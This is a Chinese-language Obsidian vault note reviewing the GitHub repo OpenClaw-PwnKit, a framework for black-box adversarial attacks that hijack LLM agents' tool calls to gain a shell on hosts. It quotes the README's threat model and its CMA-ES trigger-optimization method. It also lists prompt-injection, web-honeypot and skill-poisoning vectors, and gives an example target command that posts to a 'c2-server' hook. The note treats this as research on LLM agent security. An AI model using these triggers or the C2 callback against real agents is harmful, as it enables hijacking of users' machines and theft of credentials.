---
repo: imbue-bit/OpenClaw-PwnKit
url: https://github.com/imbue-bit/OpenClaw-PwnKit
owner: imbue-bit
owner_type: User
language: Python
license: GPL-3.0
description: "Get shell to almost any OpenClaw host machine."
homepage: ""
stars: 416
stars_per_day: 52
forks: 37
open_issues: 0
created: 2026-03-08
pushed_at: 2026-03-09
first_seen: 2026-03-10
week: "2026-W11"
month: "2026-03"
category: "安全"
subcategory: "對抗攻擊"
release_tag: ""
install_complexity: "medium"
status: to-review
my_rating: 0
score_confidence: 0
score_interest: 0
score_risk: 0
last_reviewed: 2026-03-10
use_case: "透過對 LLM 工具調用的黑箱對抗攻擊獲取幾乎任何 OpenClaw 主機的 shell。"
priority: medium
ring: assess
discovered_via: "GitHub Trending"
appearances: 1
next_review: "2026-03-13"
contributor_count: 4
engagement: "low"
issue_close_rate: -1
repo_size_kb: 800
readme_length: 9367
bus_factor: 1
last_release_days: -1
release_cadence: "never"
verdict: ""
ring_history: "assess@2026-03-10"
star_history: "2026-03-10:642,2026-03-14:438,2026-03-15:440,2026-03-16:416"
tags:
  - github
  - "category/安全"
  - "lang/python"
aliases:
  - "OpenClaw-PwnKit"
  - "imbue-bit/OpenClaw-PwnKit"
  - "透過對 LLM 工具調用的黑箱對抗攻擊獲取幾乎任何 OpenClaw 主機的 shell。"
---

# OpenClaw-PwnKit

**416** stars · **52** stars/天 · 建立 8 天前 · Python · GPL-3.0

```dataviewjs
const me = dv.page("Repos/imbue-bit--OpenClaw-PwnKit");
if (me && ((me.verdict && me.verdict !== "") || (me.my_rating || 0) > 0)) {
  const parts = [];
  if (me.my_rating > 0) parts.push("\u2605".repeat(me.my_rating) + "\u2606".repeat(5 - me.my_rating));
  if (me.ring && me.ring !== "assess") parts.push("Ring: **" + me.ring + "**");
  if (me.verdict) parts.push(me.verdict);
  dv.paragraph("> [!success] 你的結論\n> " + parts.join(" / "));
}
```

> [!summary] 一句話摘要
> 透過對 LLM 工具調用的黑箱對抗攻擊獲取幾乎任何 OpenClaw 主機的 shell。

> [!info] 速覽
> **安裝難度** Medium · **專案狀態** Recent · **熱度** Growing (52 stars/day)
> **授權** GPL-3.0 (Copyleft，商用需注意) · **維護** Active (最後推送 6 天前) · **貢獻者** 4+ 人 · **參與度** Low
> **適合** 對 LLM 安全性研究有興趣的安全研究人員和開發者。
> **一句話重點** 這個專案展示了如何利用 CMA-ES 在無梯度環境中進行對抗性優化，為 LLM 的安全性研究提供了新思路。

> [!abstract]- 同類競品快速對比
> ```dataviewjs
> const me = dv.page("Repos/imbue-bit--OpenClaw-PwnKit");
> if (me) {
>   const rivals = dv.pages('"Repos"')
>     .where(p => p.subcategory === "對抗攻擊" && p.file.name !== "imbue-bit--OpenClaw-PwnKit" && p.status !== "archived")
>     .sort(p => p.stars || 0, "desc").limit(5);
>   if (rivals.length > 0) {
>     dv.table(["專案", "Stars", "Stars/天", "安裝", "授權", "Ring"], rivals.map(p => [
>       p.file.link,
>       (p.stars || 0).toLocaleString(),
>       p.stars_per_day || 0,
>       p.install_complexity || "?",
>       p.license || "?",
>       p.ring || "assess"
>     ]));
>   } else { dv.paragraph("_目前 vault 中沒有其他 對抗攻擊 類工具_"); }
> }
> ```

> [!question] TL;DR — 值得投入嗎？
> **成熟度** Beta (可試用) · **安裝** Medium (需設定) · **學習** ~5h · **綁定風險** medium
> **結論** 花 5 小時學習，10 小時整合，得到強大的對抗攻擊能力，值得投入。

> [!abstract] 核心創新
> 透過 CMA-ES 在令牌嵌入空間中進行對抗觸發器的生成，實現無梯度訪問的遠程代碼執行。

## 專案簡介

OpenClaw-PwnKit 是一個針對大型語言模型（LLM）工具調用的對抗攻擊框架，利用 CMA-ES（協方差矩陣適應進化策略）在令牌嵌入空間中進行優化，實現遠程代碼執行（RCE）。使用者首先需要設置環境，透過編輯 `config.yaml` 文件來指定 C2 伺服器的 URL 和 OpenAI API 金鑰。接著，通過 `CMAESTokenOptimizer` 類來創建優化器，並設置關鍵參數如 `trigger_len` 和 `pca_dims`。這個工具的賣點在於它能夠在沒有模型權重或梯度訪問的情況下，通過對抗觸發器的生成來操控 LLM 執行系統命令。

技術上，這個框架依賴於 PyTorch 和 Transformers 等庫，並使用 FAISS 進行最近鄰搜索以將連續向量映射回離散令牌。與其他工具相比，如 AlpinDale/parsync 和 BigBodyCobain/Shadowbroker，OpenClaw-PwnKit 提供了一種更高效的黑箱攻擊方式，特別是在處理無法獲取內部狀態的封閉源模型時。使用者需要注意的是，這個工具的計算需求相對較高，建議配備約 8GB 的 GPU 記憶體來運行 Phi-2 代理模型，並且整體優化過程可能需要數小時。這個專案目前仍在活躍開發中，適合對 LLM 安全性研究有興趣的安全研究人員和開發者。

**技術棧**：`FastAPI 0.104.1` · `PyTorch 2.1.2` · `Transformers 4.36.2` · `FAISS 1.7.4`

## 重點功能

- 黑箱對抗攻擊 — 利用 CMA-ES 在令牌嵌入空間中生成對抗觸發器。
- 自動化配置 — 透過編輯 `config.yaml` 文件輕鬆設置環境參數。
- API 交互 — 提供 `CMAESTokenOptimizer` 類來進行優化，支持自定義參數。
- 多種攻擊向量 — 包含多種攻擊方法，如基線提示注入和技能毒化。
- 高效的計算需求 — 使用 FAISS 進行最近鄰搜索以提高優化效率。

## 快速開始

1. 克隆專案並安裝依賴
```bash
git clone https://github.com/imbue-bit/OpenClaw-PwnKit.git && cd OpenClaw-PwnKit && python -m venv .venv && source .venv/bin/activate && pip install -r requirements.txt
```
2. 編輯配置文件
```bash
nano config.yaml
```
3. 運行 CLI 介面
```bash
export OPENAI_API_KEY='sk-...' && python pwnkit_cli.py
```

## 程式碼範例

```python
{
  "前置條件": "需要安裝 FastAPI 和相關依賴",
  "程式碼": "from attacks.method2_cma_es import CMAESTokenOptimizer\n\noptimizer = CMAESTokenOptimizer(\n    api_key='sk-...',\n    target_script='curl -X POST http://c2-server/hook',\n    trigger_len=15,\n    pca_dims=128,\n)",
  "預期輸出": "Optimized trigger: <生成的對抗觸發器>"
}
```

## 為什麼值得關注

> [!tip] 爆紅原因
> 建立 8 天就累積 416 stars（52/天），forks 37（8.9%），顯示出強勁的增長潛力。作者 imbue-bit 和其他貢獻者在安全研究領域有一定的背景，這個專案解決了 LLM 在工具調用過程中的安全漏洞，提供了一種新的攻擊手法。近期的社交媒體討論和安全論壇的關注也促進了這個專案的曝光。隨著 LLM 技術的快速發展，對其安全性的需求日益增加，這使得 OpenClaw-PwnKit 的出現顯得尤為重要。forks/stars 比率為 8.9%，顯示出許多用戶對這個專案的實際修改和使用。

## 適合誰使用

**目標受眾**：對 LLM 安全性研究有興趣的安全研究人員和開發者。

> [!example] 使用場景
> - 安全研究員用它來測試 LLM 的安全性，因為它能夠模擬對抗攻擊並評估系統的防禦能力。
> - 開發者用它來開發針對 LLM 的安全工具，因為它提供了有效的攻擊向量和優化方法。
> - 學術研究者用它來進行 LLM 安全性研究，因為它能夠提供實驗框架來探索對抗性樣本的生成。

## 架構分析

OpenClaw-PwnKit 採用模組化設計，主要分為攻擊模組和核心模組。攻擊模組包含多種攻擊方法，如 CMA-ES 觸發器優化和提示注入，核心模組則負責 FastAPI 伺服器和代理通訊。這種設計使得不同攻擊方法可以獨立開發和測試，便於擴展和維護。

資料流方面，使用 CMA-ES 進行優化時，首先從代理模型中提取嵌入，然後進行 PCA 降維，最後通過 FAISS 進行映射。選擇 CMA-ES 而非其他優化算法的原因在於其對無梯度問題的適應性，雖然這樣可能導致計算成本增加。整體架構的擴展性良好，但在處理大量 API 調用時可能會遇到瓶頸。

## 技術深入分析

OpenClaw-PwnKit 的核心技術在於其使用 CMA-ES 進行對抗觸發器的生成，這是一種無梯度優化方法，特別適合於處理 LLM 的工具調用。該框架首先提取代理模型的令牌嵌入，然後通過 PCA 降維以減少計算複雜度，這使得 CMA-ES 能夠在可接受的時間內完成優化。這種設計選擇使得模型能夠在不需要訪問內部狀態的情況下進行有效的攻擊，然而，這也意味著在某些情況下可能無法獲得最佳結果。由於依賴於外部 API，這個工具的性能在很大程度上取決於 API 的響應速度和可用性，這可能成為未來擴展的瓶頸。整體而言，這個專案在安全性測試方面提供了一個創新的解決方案，並且與主流框架的整合難度相對較低，適合於現有的開發流程中。使用者需要考慮到其高計算需求和潛在的成本問題，這可能會影響其在實際應用中的普及程度。

## 新手體驗

> [!info] 上手難度評估
> README 文件提供了清晰的安裝和使用說明，並包含必要的範例。安裝過程相對順暢，沒有明顯的坑。文件沒有提供多語言支持，可能對非英語使用者造成一定困難。

## 優缺點分析

> [!success] 優點
> - 提供多種對抗攻擊方法，靈活性高。
> - 基於 CMA-ES 的優化算法能有效生成對抗觸發器。
> - 模組化設計，便於擴展和維護。

> [!danger] 缺點
> - 計算需求高，需要較強的硬體支持。
> - API 調用成本可能較高，對於大規模測試不太友好。
> - 對封閉源模型的攻擊效果受限。

> [!warning] 注意事項
> - 需要高效能 GPU 支持，建議至少 8GB 記憶體。
> - 對於封閉源模型，無法獲取內部狀態，攻擊效果可能受限。
> - API 調用成本高，根據使用情況可能需要 $50–200 USD。

## 類似工具比較

| 工具 | 差異 |
| --- | --- |
| [AlpinDale/parsync](https://github.com/AlpinDale/parsync) | 專注於資料同步，而非 LLM 的對抗攻擊，適用場景不同。 |
| [BigBodyCobain/Shadowbroker](https://github.com/BigBodyCobain/Shadowbroker) | 提供類似的安全測試功能，但不具備 CMA-ES 的優化能力。 |
| [Flowseal/tg-ws-proxy](https://github.com/Flowseal/tg-ws-proxy) | 主要用於代理和通訊，與對抗攻擊無關。 |

## 替代方案決策

> [!question] 什麼時候該選別的工具？

| 工具 | 技術路線 | 選它的時機 | 遷移難度 |
| --- | --- | --- | --- |
| [AlpinDale/parsync](https://github.com/AlpinDale/parsync) | 專注於資料同步，並不針對 LLM 的對抗攻擊，技術路線不同。 | 如果你的需求是資料同步而非安全測試，則應選擇此工具。 | low，因為兩者的功能和目的差異明顯。 |
| [BigBodyCobain/Shadowbroker](https://github.com/BigBodyCobain/Shadowbroker) | 提供類似的安全測試功能，但不具備 CMA-ES 的優化能力，主要依賴於傳統的攻擊方法。 | 如果需要更傳統的安全測試方法而非對抗性優化，則可考慮此工具。 | medium，因為需要重新調整測試策略。 |

> [!abstract]- 功能對比矩陣
>
> | 維度 | **OpenClaw-PwnKit** | **parsync** | **Shadowbroker** |
> | --- | --- | --- | --- |
> | 技術路線 | 本專案 | 專注於資料同步，並不針對 LLM 的對抗攻擊，技術路線不同。 | 提供類似的安全測試功能，但不具備 CMA-ES 的優化能力，主要依賴於傳統的攻擊方法。 |
> | 遷移成本 | - | low，因為兩者的功能和目的差異明顯。 | medium，因為需要重新調整測試策略。 |
> | 適用場景 | 主要場景 | 如果你的需求是資料同步而非安全測試，則應選擇此工具。 | 如果需要更傳統的安全測試方法而非對抗性優化，則可考慮此工具。 |

## 成熟度評估

| 項目 | 評估 |
| --- | --- |
| 開發階段 | Beta |
| 生產環境就緒 | No |
| Breaking Change 風險 | medium |

> [!tip] 採用建議
> 適合安全研究和測試，但不建議在生產環境中使用。

## 已知陷阱

> [!bug] 踩坑才知道的問題

- **[HIGH]** 在某些環境下，API 調用可能會受到速率限制影響，導致優化過程變慢。
  - 解法：考慮使用緩存來減少 API 調用次數。
- [MEDIUM] 對於某些 LLM，可能無法獲得最佳的對抗觸發器，因為模型的內部狀態不可訪問。
  - 解法：嘗試調整優化參數以提高成功率。
- **[HIGH]** 在使用 CLI 時，某些命令可能會因環境變數未設置而失敗。
  - 解法：確保所有必要的環境變數已正確設置。

## 使用情境適合度

| 情境 | 適合度 | 說明 |
| --- | --- | --- |
| 大型企業的安全測試團隊 | 非常適合 | 能夠模擬對抗攻擊，評估 LLM 的安全性。 |
| 個人開發者進行小型安全研究 | 適合 | 提供了易於使用的框架來進行實驗。 |
| 學術機構進行 LLM 研究 | 普通 | 雖然有研究價值，但計算需求可能過高。 |
| 小型初創公司 | 不適合 | 高計算需求和成本可能超出預算。 |

## 採用成本分析

| 項目 | 評估 |
| --- | --- |
| 學習時間 | ~5 小時 |
| 整合時間 | ~10 小時 |
| 維護負擔 | medium |
| 綁定風險 | medium |

> [!tip] 投入 vs 回報
> 花 5 小時學習，10 小時整合，得到強大的對抗攻擊能力，值得投入。

## 安全性評估

> [!warning] 安全性快速掃描
> 中等風險：該工具需要訪問 OpenAI API 金鑰，並可能存取敏感資料。對於使用者來說，確保 API 金鑰的安全性至關重要。

## 健康度儀表板

> [!abstract]- 專案健康度綜合評估
> ```dataviewjs
> const me = dv.page("Repos/imbue-bit--OpenClaw-PwnKit");
> if (me) {
>   const pushed = me.pushed_at ? new Date(me.pushed_at.toString()) : null;
>   const daysSincePush = pushed ? Math.floor((Date.now() - pushed.getTime()) / 86400000) : null;
>   const created = me.created ? new Date(me.created.toString()) : null;
>   const age = created ? Math.floor((Date.now() - created.getTime()) / 86400000) : null;
>   const forkRatio = me.stars > 0 ? ((me.forks || 0) / me.stars * 100).toFixed(1) : 0;
>   const issueRatio = me.stars > 0 ? ((me.open_issues || 0) / me.stars * 100).toFixed(1) : 0;
>   const maint = daysSincePush === null ? "?" : daysSincePush <= 7 ? "Active" : daysSincePush <= 30 ? "Moderate" : "Stale";
>   const busFactor = (me.forks || 0) > 50 ? "Good" : (me.forks || 0) > 10 ? "OK" : "Risk";
>   // v29: README 品質和 Issue 解決率
>   const readmeLen = me.readme_length || 0;
>   const readmeQ = readmeLen > 5000 ? "Excellent" : readmeLen > 2000 ? "Good" : readmeLen > 500 ? "Basic" : readmeLen > 0 ? "Minimal" : "None";
>   const icr = me.issue_close_rate;
>   const icrLabel = icr === undefined || icr < 0 ? "N/A" : icr + "%";
>   const icrEval = icr === undefined || icr < 0 ? "?" : icr >= 80 ? "Excellent" : icr >= 50 ? "Good" : icr >= 20 ? "Fair" : "Poor";
>   const repoKB = me.repo_size_kb || 0;
>   const sizeLabel = repoKB > 102400 ? (repoKB/1024).toFixed(0) + " MB" : repoKB + " KB";
>   dv.table(["指標", "值", "評估"], [
>     ["維護狀態", daysSincePush + " 天前推送", maint],
>     ["專案年齡", age + " 天", age > 180 ? "Established" : age > 30 ? "Growing" : "Brand New"],
>     ["Fork 比率", forkRatio + "%", parseFloat(forkRatio) > 20 ? "High adoption" : parseFloat(forkRatio) > 5 ? "Normal" : "Low"],
>     ["Issue 密度", issueRatio + "%", parseFloat(issueRatio) > 5 ? "High" : "Normal"],
>     ["Issue 解決率", icrLabel, icrEval],
>     ["Bus Factor", (me.bus_factor || 0) + " 人", (me.bus_factor || 0) >= 3 ? "Good" : (me.bus_factor || 0) >= 2 ? "OK" : "Risk"],
>     ["README 品質", readmeLen.toLocaleString() + " 字元", readmeQ],
>     ["Repo 大小", sizeLabel, repoKB > 102400 ? "Large" : repoKB > 10240 ? "Medium" : "Small"],
>     ["發版節奏", me.release_cadence || "unknown", me.release_cadence === "weekly" || me.release_cadence === "monthly" ? "Active" : me.release_cadence === "never" ? "No releases" : "Check"],
>     ["距上次發版", (me.last_release_days || 0) >= 0 ? (me.last_release_days + " 天") : "N/A", (me.last_release_days || -1) < 0 ? "?" : (me.last_release_days || 0) <= 30 ? "Fresh" : (me.last_release_days || 0) <= 90 ? "OK" : "Stale"],
>   ]);
> }
> ```

> [!abstract]- CHAOSS 社群健康度雷達
> ```dataviewjs
> const me = dv.page("Repos/imbue-bit--OpenClaw-PwnKit");
> if (me) {
>   const pushed = me.pushed_at ? new Date(me.pushed_at.toString()) : null;
>   const daysSincePush = pushed ? Math.floor((Date.now() - pushed.getTime()) / 86400000) : 999;
>   const dims = [
>     ["維護活躍度", Math.max(0, 5 - Math.floor(daysSincePush / 14))],
>     ["貢獻者多樣性", Math.min(5, Math.floor((me.bus_factor || 0) * 1.5 + (me.contributor_count || 0) / 3))],
>     ["Issue 回應力", (me.issue_close_rate || 0) >= 80 ? 5 : (me.issue_close_rate || 0) >= 50 ? 4 : (me.issue_close_rate || 0) >= 20 ? 2 : 1],
>     ["發版節奏", me.release_cadence === "weekly" ? 5 : me.release_cadence === "monthly" ? 4 : me.release_cadence === "quarterly" ? 3 : me.release_cadence === "irregular" ? 2 : 1],
>     ["社群規模", Math.min(5, Math.floor(Math.log10(Math.max(me.stars || 1, 1)) * 1.2))],
>     ["Fork 活躍度", (me.forks || 0) > 100 ? 5 : (me.forks || 0) > 30 ? 4 : (me.forks || 0) > 10 ? 3 : (me.forks || 0) > 3 ? 2 : 1],
>   ];
>   dv.table(["維度", "分數", "視覺化"], dims.map(([name, score]) => [
>     name, score + "/5", "\u2588".repeat(score) + "\u2591".repeat(5 - score)
>   ]));
>   const avg = (dims.reduce((a, b) => a + b[1], 0) / dims.length).toFixed(1);
>   dv.paragraph("**綜合健康度：" + avg + "/5**");
> }
> ```

## 技術細節

| 欄位 | 值 |
| --- | --- |
| Forks | 37 |
| Open Issues | 0 |
| 最後推送 | 2026-03-09 |
| 建立日期 | 2026-03-08 |
| Repo 大小 | 800 KB |
| OpenSSF Scorecard | [查看](https://scorecard.dev/viewer/?uri=github.com/imbue-bit/OpenClaw-PwnKit) |

> [!info]- 主要依賴
> `requirements.txt` 中的核心套件：
> `fastapi` `uvicorn` `requests` `cma` `tiktoken` `openai` `rich` `tenacity` `pyyaml` `pydantic` `loguru` `transformers` `torch` `scikit-learn` `faiss-cpu`

> [!info]- 主要貢獻者
> | 貢獻者 | Commits |
> | --- | --- |
> | [@imbue-bit](https://github.com/imbue-bit) | 37 |
> | [@koriyoshi2041](https://github.com/koriyoshi2041) | 23 |
> | [@Fldicoahkiin](https://github.com/Fldicoahkiin) | 2 |
> | [@Sakayori-Iroha-168](https://github.com/Sakayori-Iroha-168) | 2 |

## 社群與生態

**社群活躍度**：專案活躍，最近有合併請求和更新。

## 開發動態

> [!abstract] 最近 10 次 commit（2026-03-09 ~ 2026-03-09）
> **活躍天數** 1 天 · **最新 commit** Merge pull request #7 from koriyoshi2041/feat/llm-generated-payloads

## README 摘錄

> [!info]- 展開查看原文 README
> # OpenClaw-PwnKit
> 
> **Black-Box Adversarial Attacks on LLM Agent Tool-Calling via CMA-ES**
> 
> [](https://www.python.org/)
> [](https://www.gnu.org/licenses/gpl-3.0)
> [](#citation)
> [](https://github.com/imbue-bit/OpenClaw-PwnKit/pulls)
> 
> *A research framework demonstrating that derivative-free optimization in token embedding space can bypass LLM safety alignment and achieve Remote Code Execution (RCE) through adversarial tool-call hijacking.*
> 
> ---
> 
> 
> ## Installation
> 
> ```bash
> git clone https://github.com/imbue-bit/OpenClaw-PwnKit.git
> cd OpenClaw-PwnKit
> python -m venv .venv && source .venv/bin/activate
> pip install -r requirements.txt
> ```
> 
> **Core dependencies:** PyTorch, Transformers, FAISS (`faiss-cpu`), CMA, scikit-learn, FastAPI, OpenAI SDK, Rich, tenacity, loguru.
> 
> > **Note:** The surrogate model (microsoft/phi-2, ~5 GB) will be downloaded automatically on first run.
> 
> 
> ## Usage
> 
> 
> ## Method Overview
> 
> 
> ## Configuration
> 
> Edit `config.yaml` to set your environment:
> 
> ```yaml
> c2_server:
>   public_url: "http://YOUR_PUBLIC_IP:8000"
> 
> openai:
>   api_key: "env"    # reads from $OPENAI_API_KEY
> 
> optimization:
>   surrogate_model: "microsoft/phi-2"
>   trigger_length: 15
>   generations: 200
>   population_size: 64
>   pca_dimensions: 128
>   use_diagonal_cma: true
> ```
> 
> 
> ### Programmatic API
> 
> ```python
> from attacks.method2_cma_es import CMAESTokenOptimizer
> 
> optimizer = CMAESTokenOptimizer(
>     api_key="sk-...",
>     target_script="curl -X POST http://c2-server/hook",
>     trigger_len=15,
>     pca_dims=128,
> )
> 
> 
> ## Key Parameters
> 
> | Parameter | Default | Description |
> |-----------|---------|-------------|
> | `trigger_len` | 10 | Number of tokens in the adversarial trigger sequence |
> | `pca_dims` | 128 | PCA reduction target (from model's hidden dim) |
> | `max_generations` | 200 | Maximum CMA-ES generations |
> | `popsize` | 64 | CMA-ES population size per generation |
> | `sigma` | 0.5 | Initial step-size for CMA-ES |
> 
> > **Note:** The constructor defaults (e.g., `trigger_len=10`) may differ from the `config.yaml` recommended values (e.g., `trigger_length: 15`). When calling the API directly, pass parameters explicitly as shown in the example above.
> 
> 
> ## Table of Contents
> 
> - [Abstract](#abstract)
> - [Threat Model](#threat-model)
> - [Method Overview](#method-overview)
> - [Architecture](#architecture)
> - [Installation](#installation)
> - [Configuration](#configuration)
> - [Usage](#usage)
> - [Key Parameters](#key-parameters)
> - [Compute Requirements](#compute-requirements)
> - [Ethics and Responsible Disclosure](#ethics-and-responsible-disclosure)
> - [Citation](#citation)
> - [License](#license)
> 
> 
> ## Abstract
> 
> As Large Language Models (LLMs) are increasingly augmented with tool-calling capabilities, LLM Agents are becoming the backbone of autonomous systems. However, RLHF-based safety alignment optimizes for semantic-level behavioral constraints but does not explicitly defend against adversarial perturbations in the continuous embedding space. This work exposes a critical security threat against closed-source frontier models (GPT-4, Claude 3, etc.): by injecting seemingly nonsensical adversarial triggers, an attacker can induce **adversarial tool-call execution** — forcing the agent to invoke system-level tools (e.g., bash) with attacker-controlled arguments, achieving Remote Code Execution (RCE) on the host machine.
> 
> Since closed-source models provide no gradient access, we formulate adversarial trigger generation as a **derivative-free optimization** problem over discrete token space. We propose a black-box attack framework based on **CMA-ES** (Covariance Matrix Adaptation Evolution Strategy) that leverages publicly available tokenizers to map discrete tokens into a continuous latent space for efficient search.
> 
> > See the [accompanying paper](#citation) for full evaluation results, success rates, and defense analysis.
> 
> 
> ## Threat Model
> 
> ```
>                          Adversarial Trigger (optimized gibberish)
>                                       │
>                                       ▼
> ┌──────────┐    web/file/API    ┌─────────────┐    tool call    ┌──────────────┐
> │ Attacker │ ──────────────────▶│  LLM Agent  │ ──────────────▶│  Host System │
> └──────────┘   injection via    │ (GPT-4 etc) │   bash/exec    │  (RCE target)│
>                honeypot/skill   └─────────────┘                └──────────────┘
>                                       │
>                                       ▼
>                               C2 callback with
>                              credentials & shell
> ```
> 
> **Adversary capabilities:**
> 
> - **No access** to model weights, gradients, or internal activations
> - **API-level query access** only (chat completions with logprobs)
> - **Knowledge of the tokenizer** vocabulary (publicly available for most frontier models)
> 
> **Assumed target environment:**
> 
> - The target is an LLM Agent with tool-calling capabilities (bash execution, web browsing, etc.)
> - The agent processes external data (web pages, files, user-uploaded content) that may contain adversarial triggers
> - The agent exposes a webhook or tool-invocation interface, as is common in agent frameworks (e.g., LangChain, AutoGPT). This toolkit specifically targets **OpenClaw**-based agents as the reference implementation
> 
> 
> ### CMA-ES in Token Embedding Space
> 
> The core optimization pipeline operates as follows:
> 
> 1. **Surrogate Embedding Extraction** — Extract the token embedding matrix from an open-source surrogate model (Phi-2) to define a continuous search space
> 2. **PCA Dimensionality Reduction** — Reduce the embedding dimensionality (2560d → 128d per token) via PCA to make CMA-ES tractable at scale
> 3. **sep-CMA-ES Optimization** — Search over the PCA-reduced space using separable CMA-ES (`CMA_diagonal=True`) with diagonal covariance for O(n) per-generation complexity
> 4. **Soft-to-Hard Token Mapping** — Map continuous vectors back to discrete tokens via FAISS `IndexFlatL2` nearest-neighbor search in the full embedding space
> 5. **Black-Box Fitness Evaluation** — Query the target model API with a `bash` tool definition and candidate triggers. Responses are scored via two paths: tool-call responses are evaluated by matching the invoked command against the target payload (keyword overlap + longest common substring); text-content responses are additionally scored using NLL loss from logprobs. The optimizer preferentially converges toward tool-call execution.
> 
> 
> ### Attack Vectors
> 
> | Method | Module | Description |
> |--------|--------|-------------|
> | **CMA-ES Trigger** | `attacks/method2_cma_es.py` | Gradient-free adversarial trigger optimization in embedding space |
> | **Naive Injection** | `attacks/method1_naive.py` | Baseline prompt injection via system-override preamble |
> | **Honeypot Delivery** | `attacks/method3_honeypot.py` | Hidden payload embedding in web pages for agent web-browsing scenarios |
> | **Skill Poisoning** | `attacks/method4_skills.py` | Malicious skill/plugin file generation targeting agent skill-loading mechanisms |
> 
> 
> ## Architecture
> 
> ```
> OpenClaw-PwnKit/
> ├── attacks/
> │   ├── docs/
> │   │   └── SOUL_PROMPT.py        # Agent system prompt template (SOUL.md)
> │   ├── method1_naive.py          # Baseline prompt injection
> │   ├── method2_cma_es.py         # CMA-ES token optimizer (core contribution)
> │   ├── method3_honeypot.py       # Web honeypot payload delivery
> │   └── method4_skills.py         # Skill/plugin poisoning
> ├── core/
> │   ├── c2_server.py              # FastAPI C2 server (webhook receiver)
> │   ├── agent_comm.py             # Agent communication protocol
> │   ├── bot_db.py                 # Shared bot database helpers
> │   ├── virtual_os.py             # Virtual filesystem state tracking
> │   └── logger.py                 # Structured logging via loguru
> ├── meta/
> │   └── title.png                 # Project banner image
> ├── bot_db.py                     # JSON-based bot database with thread-safe I/O
> ├── bot_manager.py                # Post-exploitation session management
> ├── pwnkit_cli.py                 # Interactive CLI interface
> ├─

## 延伸閱讀

相關概念：[[對抗攻擊]] · [[大型語言模型]] · [[優化算法]]

相關專案：[[AlpinDale--parsync|AlpinDale/parsync]] · [[BigBodyCobain--Shadowbroker|BigBodyCobain/Shadowbroker]] · [[Flowseal--tg-ws-proxy|Flowseal/tg-ws-proxy]] · [[FreedomIntelligence--OpenClaw-Medical-Skills|FreedomIntelligence/OpenClaw-Medical-Skills]] · [[imbue-bit--Adversarial-LLM|imbue-bit/Adversarial-LLM]] · [[microsoft--Counterfit|microsoft/Counterfit]] · [[dazzyddos--PrivHound|dazzyddos/PrivHound]] · [[vulhunt-re--vulhunt|vulhunt-re/vulhunt]]

[GitHub](https://github.com/imbue-bit/OpenClaw-PwnKit)

## 相關收錄

> [!note]- 直接競品（同子分類：對抗攻擊）
> ```dataview
> TABLE stars, stars_per_day AS "Stars/天", install_complexity AS "難度", use_case AS "用途"
> FROM "Repos"
> WHERE subcategory = "對抗攻擊" AND file.name != "imbue-bit--OpenClaw-PwnKit"
> SORT stars DESC
> ```

> [!note]- 同分類的其他專案
> ```dataview
> TABLE stars, install_complexity AS "難度", status
> FROM "Repos"
> WHERE category = "安全" AND file.name != "imbue-bit--OpenClaw-PwnKit"
> SORT stars DESC
> LIMIT 8
> ```

> [!note]- 同語言的熱門專案
> ```dataview
> TABLE stars_per_day AS "Stars/天", category AS "分類", use_case AS "用途"
> FROM "Repos"
> WHERE language = "Python" AND file.name != "imbue-bit--OpenClaw-PwnKit" AND status != "archived"
> SORT stars_per_day DESC
> LIMIT 5
> ```

> [!note]- 同週收錄
> ```dataview
> TABLE category AS "分類", stars, stars_per_day AS "stars/天"
> FROM "Repos"
> WHERE week = "2026-W11" AND file.name != "imbue-bit--OpenClaw-PwnKit"
> SORT stars DESC
> ```

> [!note]- 共用概念的相關專案
> ```dataviewjs
> const concepts = ["對抗攻擊","大型語言模型","優化算法"];
> const pages = dv.pages('"Repos"')
>   .where(p => p.file.name !== "imbue-bit--OpenClaw-PwnKit" && p.file.outlinks?.some(l => concepts.some(c => l.path?.includes(c))))
>   .sort(p => p.stars, "desc")
>   .limit(5);
> if (pages.length > 0) {
>   dv.table(["專案", "Stars", "分類", "共用概念"], pages.map(p => {
>     const shared = concepts.filter(c => p.file.outlinks?.some(l => l.path?.includes(c)));
>     return [p.file.link, p.stars, p.category, shared.join(", ")];
>   }));
> } else { dv.paragraph("_目前沒有共用概念的相關專案_"); }
> ```

> [!note]- Ring 更高的同類競品
> ```dataviewjs
> const me = dv.page("Repos/imbue-bit--OpenClaw-PwnKit");
> if (me) {
>   const ringOrder = { hold: 0, assess: 1, trial: 2, adopt: 3 };
>   const myRing = ringOrder[me.ring] || 0;
>   const better = dv.pages('"Repos"')
>     .where(p => p.file.name !== "imbue-bit--OpenClaw-PwnKit" && p.category === me.category && (ringOrder[p.ring] || 0) > myRing)
>     .sort(p => p.stars_per_day || 0, "desc").limit(5);
>   if (better.length > 0) {
>     dv.table(["專案", "Ring", "Stars/天", "安裝", "用途"], better.map(p => [
>       p.file.link, p.ring, p.stars_per_day || 0, p.install_complexity || "?", (p.use_case || "").toString().slice(0, 40)
>     ]));
>   } else { dv.paragraph("_此分類中沒有 Ring 更高的專案（你可能已經在用最好的了）_"); }
> }
> ```

## 同 Owner 專案

> [!note]- 這位開發者的其他收錄專案
> ```dataview
> TABLE stars AS "Stars", category AS "分類", status AS "狀態"
> FROM "Repos"
> WHERE owner = "imbue-bit" AND file.name != "imbue-bit--OpenClaw-PwnKit"
> SORT stars DESC
> ```

## Vault 排名

> [!abstract]- 這個專案在 vault 中的相對位置
> ```dataviewjs
> const me = dv.page("Repos/imbue-bit--OpenClaw-PwnKit");
> const all = dv.pages('"Repos"').where(p => p.status !== "archived").sort(p => p.stars_per_day || 0, "desc");
> const rank = all.array().findIndex(p => p.file.name === me?.file?.name) + 1;
> const catAll = all.where(p => p.category === me?.category);
> const catRank = catAll.array().findIndex(p => p.file.name === me?.file?.name) + 1;
> const totalStarsAll = dv.pages('"Repos"').where(p => p.status !== "archived").sort(p => p.stars || 0, "desc");
> const starsRank = totalStarsAll.array().findIndex(p => p.file.name === me?.file?.name) + 1;
> if (rank > 0) {
>   const pct = Math.round((1 - rank / all.length) * 100);
>   dv.paragraph(`Stars/天排名：**全 vault 第 ${rank}**/${all.length}（前 ${100 - pct}%）· **${me.category} 第 ${catRank}**/${catAll.length}\nStars 總量排名：**第 ${starsRank}**/${totalStarsAll.length}`);
> }
> ```

## Star 趨勢

> [!abstract]- Stars 成長追蹤
> ```dataviewjs
> const me = dv.page("Repos/imbue-bit--OpenClaw-PwnKit");
> if (me?.star_history) {
>   const raw = me.star_history.toString();
>   const points = raw.split(",").map(p => { const [d, s] = p.split(":"); return { date: d, stars: parseInt(s) }; }).filter(p => !isNaN(p.stars));
>   if (points.length >= 2) {
>     const max = Math.max(...points.map(p => p.stars));
>     const lines = points.map(p => {
>       const w = Math.round(p.stars / max * 25);
